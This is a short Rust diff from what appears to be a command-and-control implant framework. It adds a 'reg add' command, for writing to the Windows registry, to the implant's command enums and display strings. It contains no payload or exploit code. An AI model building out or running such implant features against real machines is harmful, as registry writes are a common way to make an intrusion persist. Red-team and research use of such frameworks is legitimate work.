@@ -6,7 +6,7 @@ use std::{
     path::PathBuf,
 };
 
-use crate::task_types::{BuildAllBins, FileCopyInner, RegQueryInner};
+use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner};
 
 /// Commands supported by the implant and C2.
 ///
@@ -42,6 +42,8 @@ pub enum Command {
     Pull,
     /// Query the registry
     RegQuery,
+    // Add an item to the registry
+    RegAdd,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -167,6 +169,7 @@ impl Display for Command {
             Command::Move => "Move",
             Command::Pull => "Pull",
             Command::RegQuery => "reg query",
+            Command::RegAdd => "reg add",
         };
 
         write!(f, "{choice}")
@@ -200,6 +203,7 @@ pub enum AdminCommand {
     Pull(String),
     BuildAllBins(BuildAllBins),
     RegQuery(RegQueryInner),
+    RegAdd(RegAddInner),
     Undefined,
 }
 
